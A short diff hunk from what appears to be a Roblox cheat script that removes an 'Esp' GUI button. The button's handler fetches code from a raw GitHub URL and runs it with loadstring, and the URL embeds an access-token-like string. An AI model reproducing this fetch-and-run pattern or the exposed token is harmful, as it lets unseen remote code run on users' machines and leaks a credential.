@@ -242,8 +242,3 @@ game:GetService('RunService').RenderStepped:connect(function()
 		end
 	end)
 end)
-
-ff:Label("Esp")
-ff:Button("Press", function()
-
-loadstring(game:HttpGet("https://raw.githubusercontent.com/User999191/Sa/main/README.md?token=GHSAT0AAAAAACOVX2BSGA5WYCR6Z4GRLPG2ZPQD4QQ", true))()
